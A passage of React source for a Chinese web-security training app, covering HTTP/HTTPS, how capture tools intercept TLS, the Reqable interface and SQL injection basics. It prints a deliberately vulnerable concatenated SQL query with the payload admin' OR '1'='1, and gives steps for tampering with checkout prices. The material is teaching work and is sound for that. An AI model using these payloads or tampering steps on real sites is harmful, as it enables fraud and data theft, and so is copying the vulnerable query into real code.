                    <div className="text-sm text-gray-400 mb-1">错误响应示例</div>
                    <div className="bg-[#161b22] p-3 rounded">
                      <pre className="text-xs text-red-400 font-mono">
{`{
  "success": false,
  "error": {
    "code": "INVALID_CREDENTIALS",
    "message": "用户名或密码错误",
    "details": "密码连续错误5次,账号已锁定30分钟"
  }
}`}
                      </pre>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <h2 className="text-3xl font-bold text-white mt-12 border-b-2 border-purple-500 pb-2">第二部分：HTTPS 加密原理</h2>

            <div className="bg-purple-900/20 border-l-4 border-purple-500 p-6 rounded-r mt-6">
              <h3 className="text-xl font-bold text-white mb-3">为什么需要 HTTPS？</h3>
              <p className="text-gray-300 mb-4">
                HTTP 是<strong>明文传输</strong>，任何人在网络中间都能看到你的数据(如密码、信用卡号)。HTTPS 通过 <strong>TLS/SSL 加密</strong>解决了三大问题:
              </p>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="bg-[#161b22] p-4 rounded">
                  <div className="text-green-400 font-bold mb-2">🔒 加密 (Encryption)</div>
                  <div className="text-sm text-gray-400">数据传输过程被加密,中间人无法窃听</div>
                </div>
                <div className="bg-[#161b22] p-4 rounded">
                  <div className="text-blue-400 font-bold mb-2">✅ 完整性 (Integrity)</div>
                  <div className="text-sm text-gray-400">防止数据被篡改,任何修改都会被发现</div>
                </div>
                <div className="bg-[#161b22] p-4 rounded">
                  <div className="text-yellow-400 font-bold mb-2">🆔 认证 (Authentication)</div>
                  <div className="text-sm text-gray-400">证书验证服务器身份,防止钓鱼网站</div>
                </div>
              </div>
            </div>

            <h3 className="text-2xl font-bold text-white mt-8">HTTPS 握手流程(简化版)</h3>
            <div className="bg-[#161b22] p-6 rounded border border-gray-700 mt-4">
              <pre className="text-sm text-gray-300 font-mono overflow-x-auto">
{`客户端                                              服务器
  |                                                   |
  | 1. Client Hello (支持的加密套件)                   |
  | ------------------------------------------------> |
  |                                                   |
  | <------------------------------------------------ |
  |                     2. Server Hello (选择加密套件) |
  |                     + 服务器证书(公钥)              |
  |                                                   |
  | 3. 验证证书合法性                                  |
  |    生成随机密钥                                    |
  |    用服务器公钥加密                                |
  | ------------------------------------------------> |
  |                     4. 用私钥解密,获得对称密钥       |
  |                                                   |
  | <============== 后续通信使用对称密钥加密 ==========> |
  |                                                   |`}
              </pre>
            </div>

            <div className="bg-yellow-900/20 border-l-4 border-yellow-500 p-4 rounded-r mt-6">
              <h4 className="text-yellow-400 font-bold mb-2">⚠️ 抓包工具如何解密 HTTPS？</h4>
              <p className="text-gray-300 text-sm">
                抓包工具(如 Reqable、Charles)通过<strong>中间人攻击(MITM)</strong>解密 HTTPS:
              </p>
              <ol className="list-decimal pl-5 text-sm text-gray-300 mt-2 space-y-1">
                <li>工具生成自己的 CA 证书,安装到你的系统</li>
                <li>工具拦截客户端请求,伪装成服务器</li>
                <li>工具用自己的证书与客户端建立 HTTPS 连接</li>
                <li>工具再与真实服务器建立另一个 HTTPS 连接</li>
                <li>工具解密、查看、修改数据后,重新加密转发</li>
              </ol>
              <div className="text-yellow-300 text-sm mt-3">
                💡 这也是为什么使用 Reqable 前需要<strong>安装并信任</strong>其 CA 证书。
              </div>
            </div>

            <h2 className="text-3xl font-bold text-white mt-12 border-b-2 border-green-500 pb-2">第三部分：实战演练</h2>

            <div className="bg-gradient-to-r from-green-900/30 to-blue-900/30 border border-green-500/30 p-6 rounded-lg mt-6">
              <h3 className="text-xl font-bold text-white mb-4">📝 自检清单</h3>
              <p className="text-gray-300 mb-4">完成以下练习,确保你真正掌握了 HTTP 协议:</p>

              <div className="space-y-3 text-gray-300">
                <div className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">□</span>
                  <div>
                    <div className="font-bold">能手写一个完整的 HTTP 请求</div>
                    <div className="text-sm text-gray-400">包括请求行、必需的 Headers、JSON 格式的 Body</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">□</span>
                  <div>
                    <div className="font-bold">能解释 GET 和 POST 的区别</div>
                    <div className="text-sm text-gray-400">从幂等性、数据位置、缓存、安全性四个角度</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">□</span>
                  <div>
                    <div className="font-bold">能识别常见状态码</div>
                    <div className="text-sm text-gray-400">200、301、400、403、404、500 的含义和排查方法</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">□</span>
                  <div>
                    <div className="font-bold">能解释 HTTPS 加密原理</div>
                    <div className="text-sm text-gray-400">为什么需要证书?对称加密和非对称加密如何配合?</div>
                  </div>
                </div>
                <div className="flex items-start gap-2">
                  <span className="text-green-400 mt-1">□</span>
                  <div>
                    <div className="font-bold">能独立分析真实请求</div>
                    <div className="text-sm text-gray-400">打开 Chrome DevTools,分析任意网站的 Network 请求</div>
                  </div>
                </div>
              </div>
            </div>

            <div className="mt-8 flex gap-4">
              <button
                onClick={() => onNavigateToLevel('case_01')}
                className="bg-blue-600 hover:bg-blue-500 text-white px-6 py-3 rounded-lg font-bold flex items-center gap-2 transition-colors"
              >
                <Play size={18} />
                实战 Case 01: API 协议分析
              </button>
              <button
                onClick={() => handleDocChange('traffic-analysis')}
                className="bg-purple-600 hover:bg-purple-500 text-white px-6 py-3 rounded-lg font-bold flex items-center gap-2 transition-colors"
              >
                下一章: 流量分析实战
                <ChevronRight size={18} />
              </button>
            </div>
          </div>
        );

      case 'reqable-interface':
        return (
          <div key="reqable-interface" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-4xl font-bold text-white mb-4">Reqable 界面完全指南</h1>
            <p className="text-lg text-gray-300 leading-relaxed">
              Reqable 是一款专业的 HTTP/HTTPS 抓包工具。本章将详细介绍其界面布局和核心功能模块,帮助你快速上手。
            </p>

            <div className="bg-yellow-900/20 border-l-4 border-yellow-500 p-4 rounded-r">
              <h4 className="text-yellow-400 font-bold mb-2">💡 学前须知</h4>
              <p className="text-gray-300 text-sm">
                NetRunner 中的 Reqable 模拟器是 1:1 还原真实 Reqable 软件的界面和功能。你在这里学会的操作,可以直接应用到真实的 Reqable/Charles/Fiddler 工具。
              </p>
            </div>

            <h2 className="text-3xl font-bold text-white mt-8 border-b-2 border-blue-500 pb-2">界面布局概览</h2>

            <div className="bg-[#161b22] p-6 rounded border border-gray-700 mt-4">
              <pre className="text-sm text-gray-300 font-mono">
{`┌─────────────────────────────────────────────────────────────────┐
│  Reqable                                    [ ● 录制中 ] [清空]    │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  流量列表区 (Traffic List)                                         │
│  ┌──────┬──────────┬─────────┬──────────┬─────────┬──────────┐  │
│  │ 序号 │  Method  │  Domain │   Path   │  Status │  Size    │  │
│  ├──────┼──────────┼─────────┼──────────┼─────────┼──────────┤  │
│  │  1   │   GET    │ api.com │ /users   │   200   │  1.2KB   │  │
│  │  2   │   POST   │ api.com │ /orders  │   201   │  0.5KB   │  │
│  │  3   │  DELETE  │ api.com │ /cart/42 │   403   │  0.3KB   │  │
│  └──────┴──────────┴─────────┴──────────┴─────────┴──────────┘  │
│                                                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  详情面板 (Detail Panel) - 分为 Request 和 Response 两个标签      │
│                                                                   │
│  [ Request ]  [ Response ]                                        │
│  ┌─────────────────────────────────────────────────────────────┐ │
│  │ Headers │ Body │ Raw │                                       │ │
│  ├─────────────────────────────────────────────────────────────┤ │
│  │ Host: api.example.com                                        │ │
│  │ Authorization: Bearer eyJhbGc...                             │ │
│  │ Content-Type: application/json                               │ │
│  │                                                              │ │
│  │ { "productId": 123, "quantity": 2 }                          │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                                                                   │
│  [ 🔧 Composer ]  [ 🚦 Breakpoints ]  [ 🔁 Rewrite Rules ]       │
└─────────────────────────────────────────────────────────────────┘`}
              </pre>
            </div>

            <h2 className="text-3xl font-bold text-white mt-10 border-b-2 border-green-500 pb-2">核心功能模块</h2>

            <div className="space-y-6 mt-6">
              <div className="bg-[#0d1117] border-l-4 border-green-500 p-6 rounded-r">
                <h3 className="text-2xl font-bold text-white mb-3 flex items-center gap-2">
                  <Layers className="text-green-400" size={24}/>
                  1. 流量列表 (Traffic List)
                </h3>
                <p className="text-gray-300 mb-4">
                  实时显示捕获的所有 HTTP/HTTPS 请求,按时间倒序排列(最新的在上面)。
                </p>

                <div className="bg-[#161b22] p-4 rounded mb-4">
                  <div className="font-bold text-white mb-2">列表字段说明</div>
                  <table className="w-full text-sm text-gray-300">
                    <thead>
                      <tr className="border-b border-gray-700">
                        <th className="py-2 text-left">字段</th>
                        <th className="py-2 text-left">含义</th>
                        <th className="py-2 text-left">示例</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code>Method</code></td>
                        <td>HTTP 方法</td>
                        <td><code className="text-green-400">GET</code>, <code className="text-blue-400">POST</code></td>
                      </tr>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code>Domain</code></td>
                        <td>目标域名</td>
                        <td><code>api.example.com</code></td>
                      </tr>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code>Path</code></td>
                        <td>请求路径</td>
                        <td><code>/api/users/123</code></td>
                      </tr>
                      <tr className="border-b border-gray-800">
                        <td className="py-2"><code>Status</code></td>
                        <td>响应状态码</td>
                        <td><code className="text-green-400">200</code>, <code className="text-red-400">403</code></td>
                      </tr>
                      <tr>
                        <td className="py-2"><code>Size</code></td>
                        <td>响应大小</td>
                        <td><code>1.2KB</code>, <code>45.6MB</code></td>
                      </tr>
                    </tbody>
                  </table>
                </div>

                <div className="bg-blue-900/20 border border-blue-500/30 p-3 rounded">
                  <div className="text-sm text-blue-300">
                    <strong>💡 快捷操作</strong>: 右键点击任意请求可发送到 Composer、添加断点、导出为 cURL 命令
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-blue-500 p-6 rounded-r">
                <h3 className="text-2xl font-bold text-white mb-3 flex items-center gap-2">
                  <Code2 className="text-blue-400" size={24}/>
                  2. 详情面板 (Detail Panel)
                </h3>
                <p className="text-gray-300 mb-4">
                  显示选中请求的完整信息,分为 Request 和 Response 两个标签页。
                </p>

                <div className="space-y-4">
                  <div className="bg-[#161b22] p-4 rounded">
                    <div className="font-bold text-white mb-2">Request 标签</div>
                    <ul className="text-sm text-gray-300 space-y-1 ml-4">
                      <li>• <strong>Headers</strong>: 请求头(Host, Authorization, Cookie 等)</li>
                      <li>• <strong>Body</strong>: 请求体(JSON/表单数据/文件),支持格式化和搜索</li>
                      <li>• <strong>Raw</strong>: 原始 HTTP 报文,用于学习协议格式</li>
                    </ul>
                  </div>

                  <div className="bg-[#161b22] p-4 rounded">
                    <div className="font-bold text-white mb-2">Response 标签</div>
                    <ul className="text-sm text-gray-300 space-y-1 ml-4">
                      <li>• <strong>Headers</strong>: 响应头(Content-Type, Set-Cookie, Cache-Control 等)</li>
                      <li>• <strong>Body</strong>: 响应体,自动识别并格式化 JSON/XML/HTML</li>
                      <li>• <strong>Preview</strong>: 图片预览或 HTML 渲染</li>
                      <li>• <strong>Raw</strong>: 原始响应数据</li>
                    </ul>
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-yellow-500 p-6 rounded-r">
                <h3 className="text-2xl font-bold text-white mb-3 flex items-center gap-2">
                  <PenTool className="text-yellow-400" size={24}/>
                  3. Composer (构造器)
                </h3>
                <p className="text-gray-300 mb-3">
                  手动构造 HTTP 请求的实验台,是安全测试的核心工具。详见 <button onClick={() => handleDocChange('composer')} className="text-blue-400 hover:text-blue-300 underline">Composer 完全指南</button>。
                </p>
                <div className="bg-yellow-900/20 border border-yellow-500/30 p-3 rounded">
                  <div className="text-sm text-yellow-300">
                    <strong>典型场景</strong>: 修改请求参数测试后端验证、伪造 Headers 绕过限制、重发失败请求排查问题
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-red-500 p-6 rounded-r">
                <h3 className="text-2xl font-bold text-white mb-3 flex items-center gap-2">
                  <Shield className="text-red-400" size={24}/>
                  4. Breakpoints (断点)
                </h3>
                <p className="text-gray-300 mb-3">
                  在请求发送前或响应返回前暂停,允许你实时修改数据。详见 <button onClick={() => handleDocChange('breakpoints')} className="text-blue-400 hover:text-blue-300 underline">Breakpoints 断点调试</button>。
                </p>
                <div className="bg-red-900/20 border border-red-500/30 p-3 rounded">
                  <div className="text-sm text-red-300">
                    <strong>典型场景</strong>: 绕过前端验证、伪造服务器响应、测试错误处理逻辑
                  </div>
                </div>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-purple-500 p-6 rounded-r">
                <h3 className="text-2xl font-bold text-white mb-3 flex items-center gap-2">
                  <Zap className="text-purple-400" size={24}/>
                  5. Rewrite Rules (重写规则)
                </h3>
                <p className="text-gray-300 mb-3">
                  自动化的流量修改规则,无需手动干预。详见 <button onClick={() => handleDocChange('rewriting')} className="text-blue-400 hover:text-blue-300 underline">重写规则完全指南</button>。
                </p>
                <div className="bg-purple-900/20 border border-purple-500/30 p-3 rounded">
                  <div className="text-sm text-purple-300">
                    <strong>典型场景</strong>: 批量替换 API 域名(测试环境切换)、自动注入 Headers、模拟慢网络
                  </div>
                </div>
              </div>
            </div>

            <h2 className="text-3xl font-bold text-white mt-10 border-b-2 border-pink-500 pb-2">常用操作流程</h2>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
              <div className="bg-[#161b22] p-5 rounded border border-gray-700">
                <div className="font-bold text-white mb-3 flex items-center gap-2">
                  <span className="bg-blue-600 text-white px-3 py-1 rounded">场景 1</span>
                  调试登录接口
                </div>
                <ol className="text-sm text-gray-300 space-y-2 ml-5">
                  <li>1. 开启录制,在浏览器中登录</li>
                  <li>2. 在流量列表找到 POST /api/login 请求</li>
                  <li>3. 点击查看 Request Body,检查用户名密码</li>
                  <li>4. 查看 Response,分析返回的 Token</li>
                  <li>5. 右键选择「发送到 Composer」</li>
                  <li>6. 修改密码为错误值,测试错误处理</li>
                </ol>
              </div>

              <div className="bg-[#161b22] p-5 rounded border border-gray-700">
                <div className="font-bold text-white mb-3 flex items-center gap-2">
                  <span className="bg-yellow-600 text-black px-3 py-1 rounded">场景 2</span>
                  测试价格篡改漏洞
                </div>
                <ol className="text-sm text-gray-300 space-y-2 ml-5">
                  <li>1. 在网页上提交订单</li>
                  <li>2. 找到 POST /api/checkout 请求</li>
                  <li>3. 右键「发送到 Composer」</li>
                  <li>4. 修改 Body 中的 <code>price</code> 字段为 1</li>
                  <li>5. 点击「Send」发送请求</li>
                  <li>6. 查看响应,如果返回 200,说明漏洞存在</li>
                </ol>
              </div>

              <div className="bg-[#161b22] p-5 rounded border border-gray-700">
                <div className="font-bold text-white mb-3 flex items-center gap-2">
                  <span className="bg-red-600 text-white px-3 py-1 rounded">场景 3</span>
                  使用断点修改请求
                </div>
                <ol className="text-sm text-gray-300 space-y-2 ml-5">
                  <li>1. 点击「Breakpoints」标签</li>
                  <li>2. 添加规则: URL 包含 <code>/api/submit</code></li>
                  <li>3. 选择「Request」断点</li>
                  <li>4. 在浏览器中触发提交操作</li>
                  <li>5. Reqable 自动暂停,显示编辑界面</li>
                  <li>6. 修改参数后点击「Continue」放行</li>
                </ol>
              </div>

              <div className="bg-[#161b22] p-5 rounded border border-gray-700">
                <div className="font-bold text-white mb-3 flex items-center gap-2">
                  <span className="bg-green-600 text-black px-3 py-1 rounded">场景 4</span>
                  导出为 cURL 命令
                </div>
                <ol className="text-sm text-gray-300 space-y-2 ml-5">
                  <li>1. 选中流量列表中的请求</li>
                  <li>2. 右键选择「Copy as cURL」</li>
                  <li>3. 粘贴到终端可直接执行</li>
                  <li>4. 适合分享给后端同事排查问题</li>
                  <li>5. 也可粘贴到 Postman 等工具</li>
                </ol>
              </div>
            </div>

            <div className="bg-blue-900/20 border-l-4 border-blue-500 p-6 rounded-r mt-8">
              <h4 className="text-blue-400 font-bold mb-3">💡 学习建议</h4>
              <ul className="space-y-2 text-gray-300 text-sm">
                <li>✅ <strong>边看边操作</strong> - 打开 NetRunner,对照文档操作一遍</li>
                <li>✅ <strong>熟悉快捷键</strong> - <code>Cmd+F</code>搜索、<code>Cmd+K</code>清空列表、<code>Cmd+R</code>开关录制</li>
                <li>✅ <strong>观察真实流量</strong> - 访问常用网站,观察它们的请求结构</li>
                <li>✅ <strong>做实战关卡</strong> - 完成 Case 01-03 加深理解</li>
              </ul>
            </div>

            <div className="mt-8">
              <button
                onClick={() => handleDocChange('traffic-analysis')}
                className="bg-purple-600 hover:bg-purple-500 text-white px-6 py-3 rounded-lg font-bold flex items-center gap-2 transition-colors"
              >
                下一章: 流量分析实战
                <ChevronRight size={18} />
              </button>
            </div>
          </div>
        );

      case 'rewriting':
        return (
          <div key="rewriting" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-3xl font-bold text-white flex items-center gap-3">
              <Zap className="text-purple-400"/> 重写规则 (Rewrite Rules)
            </h1>
            <p className="text-gray-300">
              重写规则是 Reqable 的高级功能,允许你自动化修改流量,无需每次手动干预。适合批量测试和环境切换。
            </p>

            <div className="bg-purple-900/20 border-l-4 border-purple-500 p-4 rounded-r">
              <h4 className="text-purple-400 font-bold mb-2">💡 Rewrite vs Breakpoints vs Composer</h4>
              <ul className="text-sm text-gray-300 space-y-1">
                <li>• <strong>Composer</strong>: 手动构造单个请求,适合一次性测试</li>
                <li>• <strong>Breakpoints</strong>: 实时暂停修改,适合调试和学习</li>
                <li>• <strong>Rewrite</strong>: 自动化批量修改,适合重复性操作</li>
              </ul>
            </div>

            <h2 className="text-2xl font-bold text-white mt-6 border-b border-gray-700 pb-2">典型应用场景</h2>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">场景 1: 环境切换</div>
                <p className="text-sm text-gray-400">
                  自动将所有 <code>api.prod.com</code> 替换为 <code>api.test.com</code>,无需修改前端代码。
                </p>
              </div>
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">场景 2: 注入 Headers</div>
                <p className="text-sm text-gray-400">
                  为所有请求自动添加 <code>X-Debug: true</code>,开启后端调试模式。
                </p>
              </div>
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">场景 3: 模拟慢网络</div>
                <p className="text-sm text-gray-400">
                  延迟所有图片请求 3 秒,测试加载动画效果。
                </p>
              </div>
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <div className="font-bold text-white mb-2">场景 4: 强制 HTTPS</div>
                <p className="text-sm text-gray-400">
                  将所有 <code>http://</code> 自动重定向到 <code>https://</code>。
                </p>
              </div>
            </div>

            <div className="bg-[#161b22] p-4 rounded border border-gray-700 mt-6">
              <p className="text-sm text-gray-400">
                <strong>注意</strong>: NetRunner 当前版本暂未实现完整的 Rewrite 功能,建议先掌握 Composer 和 Breakpoints。在真实 Reqable 软件中,Rewrite Rules 支持正则表达式和 JavaScript 脚本。
              </p>
            </div>

            <button onClick={() => onNavigateToLevel('case_02')} className="mt-4 bg-purple-700 hover:bg-purple-600 text-white px-4 py-2 rounded font-bold text-sm transition-colors">
              返回练习 Composer 功能
            </button>
          </div>
        );

      case 'sqli':
        return (
          <div key="sqli" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-3xl font-bold text-white">SQL 注入基础</h1>
            <p className="text-gray-300">
              <strong>SQL 注入 (SQL Injection)</strong> 是 Web 安全中最危险的漏洞之一。攻击者通过在输入中注入恶意 SQL 代码,可以绕过认证、窃取数据甚至删除数据库。
            </p>

            <h3 className="text-xl font-bold text-white mt-4">原理示例</h3>
            <div className="bg-[#1e1e1e] p-4 rounded border border-gray-700 mt-2">
              <div className="text-sm text-gray-400 mb-2">后端代码 (有漏洞)</div>
              <pre className="text-sm text-red-400 font-mono">
{`// 直接拼接用户输入,危险!
$sql = "SELECT * FROM users WHERE username = '" + $username + "'";`}
              </pre>
              <div className="text-sm text-gray-400 mt-3 mb-2">攻击者输入</div>
              <code className="text-yellow-400 text-sm">admin' OR '1'='1</code>
              <div className="text-sm text-gray-400 mt-3 mb-2">实际执行的 SQL</div>
              <pre className="text-sm text-yellow-400 font-mono">
{`SELECT * FROM users WHERE username = 'admin' OR '1'='1'`}
              </pre>
              <div className="text-red-300 text-sm mt-2">⚠️ <code>'1'='1'</code> 永远为真,返回所有用户!</div>
            </div>

            <h3 className="text-xl font-bold text-white mt-6">防御方法</h3>
            <ul className="list-disc pl-5 space-y-2 text-gray-300 mt-2">
              <li><strong>预编译语句 (Prepared Statements):</strong> 永远不要拼接 SQL,使用参数化查询。</li>
              <li><strong>输入验证:</strong> 白名单验证,只允许预期的字符。</li>
              <li><strong>最小权限:</strong> 数据库账号只给必需的权限,避免使用 root。</li>
              <li><strong>错误信息:</strong> 不要在生产环境暴露详细的数据库错误。</li>
            </ul>

            <div className="bg-[#1e1e1e] p-4 rounded border border-gray-700 mt-4">
              <div className="text-sm text-gray-400 mb-2">安全代码 (使用预编译)</div>
              <pre className="text-sm text-green-400 font-mono">
{`// PHP PDO 示例
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);`}
              </pre>
            </div>

            <button onClick={() => onNavigateToLevel('case_10')} className="mt-4 bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded font-bold text-sm transition-colors">
              实战 Case 10：时间盲注挑战
            </button>
          </div>
        );

      case 'advanced-techniques':
        return (
          <div key="advanced-techniques" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-3xl font-bold text-white">高级抓包技巧</h1>
            <p className="text-gray-300">
              掌握了基础操作后,这些高级技巧将让你的效率翻倍。
            </p>

            <h2 className="text-2xl font-bold text-white mt-6 border-b border-gray-700 pb-2">技巧清单</h2>

            <div className="space-y-4 mt-4">
              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <h4 className="text-lg font-bold text-white mb-2">1. 过滤无关流量</h4>
                <p className="text-sm text-gray-400 mb-2">
                  在流量列表顶部使用过滤器,只显示你关心的请求:
                </p>
                <ul className="text-sm text-gray-300 list-disc pl-5 space-y-1">
                  <li><code>domain:api.example.com</code> - 只显示特定域名</li>
                  <li><code>status:4xx</code> - 只显示错误请求</li>
                  <li><code>method:POST</code> - 只显示 POST 请求</li>
                </ul>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <h4 className="text-lg font-bold text-white mb-2">2. 保存会话 (Session)</h4>
                <p className="text-sm text-gray-400">
                  Reqable 支持保存整个抓包会话为 <code>.har</code> 文件,方便后续分析或分享给同事。
                </p>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <h4 className="text-lg font-bold text-white mb-2">3. 对比请求 (Diff)</h4>
                <p className="text-sm text-gray-400">
                  选中两个请求,右键选择「Compare」,可以对比它们的差异,快速定位问题。
                </p>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <h4 className="text-lg font-bold text-white mb-2">4. 抓取 WebSocket</h4>
                <p className="text-sm text-gray-400">
                  Reqable 支持抓取 WebSocket 流量,用于调试实时聊天、推送等功能。
                </p>
              </div>

              <div className="bg-[#161b22] p-4 rounded border border-[#30363d]">
                <h4 className="text-lg font-bold text-white mb-2">5. 使用快捷键</h4>
                <ul className="text-sm text-gray-300 space-y-1">
                  <li><code>Cmd+F</code> - 搜索请求</li>
                  <li><code>Cmd+K</code> - 清空列表</li>
                  <li><code>Cmd+R</code> - 开关录制</li>
                  <li><code>Cmd+D</code> - 删除选中请求</li>
                </ul>
              </div>
            </div>
          </div>
        );

      case 'troubleshooting':
        return (
          <div key="troubleshooting" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-3xl font-bold text-white">常见问题排查</h1>
            <p className="text-gray-300">
              在使用抓包工具时,你可能会遇到以下问题。这里提供快速解决方案。
            </p>

            <div className="space-y-6 mt-6">
              <div className="bg-red-900/20 border-l-4 border-red-500 p-4 rounded-r">
                <h4 className="text-red-400 font-bold mb-2">❌ 问题 1: 抓不到 HTTPS 流量</h4>
                <p className="text-sm text-gray-300 mb-2"><strong>原因</strong>: CA 证书未安装或未信任</p>
                <p className="text-sm text-gray-300"><strong>解决</strong>:</p>
                <ol className="list-decimal pl-5 text-sm text-gray-300 mt-1 space-y-1">
                  <li>在 Reqable 中导出 CA 证书</li>
                  <li>macOS: 双击安装,在钥匙串中标记为「始终信任」</li>
                  <li>iOS: 设置 → 通用 → VPN与设备管理 → 安装描述文件</li>
                  <li>重启 Reqable 和浏览器</li>
                </ol>
              </div>

              <div className="bg-yellow-900/20 border-l-4 border-yellow-500 p-4 rounded-r">
                <h4 className="text-yellow-400 font-bold mb-2">⚠️ 问题 2: 断点不生效</h4>
                <p className="text-sm text-gray-300 mb-2"><strong>原因</strong>: 断点规则配置错误</p>
                <p className="text-sm text-gray-300"><strong>解决</strong>:</p>
                <ul className="list-disc pl-5 text-sm text-gray-300 mt-1 space-y-1">
                  <li>检查规则是否启用(开关是否打开)</li>
                  <li>确认 URL 匹配规则正确(支持通配符 <code>*</code>)</li>
                  <li>清空列表后重新触发请求</li>
                </ul>
              </div>

              <div className="bg-blue-900/20 border-l-4 border-blue-500 p-4 rounded-r">
                <h4 className="text-blue-400 font-bold mb-2">💡 问题 3: 请求显示乱码</h4>
                <p className="text-sm text-gray-300 mb-2"><strong>原因</strong>: 响应被 Gzip 或 Brotli 压缩</p>
                <p className="text-sm text-gray-300"><strong>解决</strong>: Reqable 会自动解压,如果仍乱码,检查 <code>Content-Encoding</code> 头</p>
              </div>

              <div className="bg-green-900/20 border-l-4 border-green-500 p-4 rounded-r">
                <h4 className="text-green-400 font-bold mb-2">✅ 问题 4: 移动端如何抓包</h4>
                <p className="text-sm text-gray-300 mb-2"><strong>步骤</strong>:</p>
                <ol className="list-decimal pl-5 text-sm text-gray-300 mt-1 space-y-1">
                  <li>电脑和手机连接同一 Wi-Fi</li>
                  <li>在 Reqable 中查看本机 IP(如 192.168.1.100)</li>
                  <li>手机 Wi-Fi 设置 → 配置代理 → 手动</li>
                  <li>服务器填写电脑 IP,端口填 <code>9000</code></li>
                  <li>手机浏览器访问 <code>http://reqable.local</code> 安装证书</li>
                </ol>
              </div>
            </div>
          </div>
        );

      case 'best-practices':
        return (
          <div key="best-practices" className={`space-y-6 doc-content ${isTransitioning ? 'doc-content-enter' : ''}`}>
            <h1 className="text-3xl font-bold text-white">抓包最佳实践</h1>
            <p className="text-gray-300">
              这些来自真实项目的经验,将帮助你更高效、更安全地使用抓包工具。
            </p>

            <div className="space-y-6 mt-6">
              <div className="bg-[#0d1117] border-l-4 border-green-500 p-5 rounded-r">
                <h3 className="text-xl font-bold text-white mb-3">✅ 安全规范</h3>
                <ul className="space-y-2 text-gray-300 text-sm">
                  <li>🔒 <strong>不要在公共 Wi-Fi 下抓包</strong> - 你的流量可能被他人抓取</li>
                  <li>🔒 <strong>抓包后关闭代理</strong> - 避免影响正常网络访问</li>
                  <li>🔒 <strong>不要分享包含敏感信息的 .har 文件</strong> - 其中可能有 Token、密码</li>
                  <li>🔒 <strong>定期更新抓包工具</strong> - 修复安全漏洞</li>
                  <li>🔒 <strong>只在授权环境测试</strong> - 未经授权的渗透测试是违法的</li>
                </ul>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-blue-500 p-5 rounded-r">
                <h3 className="text-xl font-bold text-white mb-3">⚡ 效率技巧</h3>
                <ul className="space-y-2 text-gray-300 text-sm">
                  <li>📌 <strong>使用过滤器</strong> - 只显示你关心的域名/状态码</li>
                  <li>📌 <strong>保存常用请求</strong> - Composer 支持保存模板</li>
                  <li>📌 <strong>使用搜索功能</strong> - Cmd+F 搜索 Headers、Body 内容</li>
                  <li>📌 <strong>导出为 cURL</strong> - 方便在命令行复现问题</li>
                  <li>📌 <strong>学会看 Timeline</strong> - 分析请求耗时瓶颈</li>
                </ul>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-yellow-500 p-5 rounded-r">
                <h3 className="text-xl font-bold text-white mb-3">🎯 调试流程</h3>
                <ol className="space-y-2 text-gray-300 text-sm list-decimal pl-5">
                  <li><strong>复现问题</strong> - 确保能稳定重现 bug</li>
                  <li><strong>开启录制</strong> - 清空列表,执行操作</li>
                  <li><strong>定位请求</strong> - 通过 URL/状态码找到问题请求</li>
                  <li><strong>分析数据</strong> - 检查 Request 和 Response</li>
                  <li><strong>假设验证</strong> - 使用 Composer 修改参数测试</li>
                  <li><strong>记录结果</strong> - 截图或导出 .har 文件</li>
                </ol>
              </div>

              <div className="bg-[#0d1117] border-l-4 border-purple-500 p-5 rounded-r">
                <h3 className="text-xl font-bold text-white mb-3">📚 持续学习</h3>
                <ul className="space-y-2 text-gray-300 text-sm">
                  <li>🎓 <strong>阅读 HTTP RFC 规范</strong> - RFC 7230-7235 是权威文档</li>
                  <li>🎓 <strong>关注 OWASP Top 10</strong> - 了解最新的 Web 安全漏洞</li>
                  <li>🎓 <strong>参加 CTF 比赛</strong> - 实战提升技能</li>
                  <li>🎓 <strong>阅读真实漏洞报告</strong> - HackerOne、BugCrowd 上有大量案例</li>
                  <li>🎓 <strong>搭建本地测试环境</strong> - DVWA、WebGoat 等靶场</li>
                </ul>
              </div>
            </div>

            <div className="bg-gradient-to-r from-blue-900/30 to-purple-900/30 border border-blue-500/30 p-6 rounded-lg mt-8">
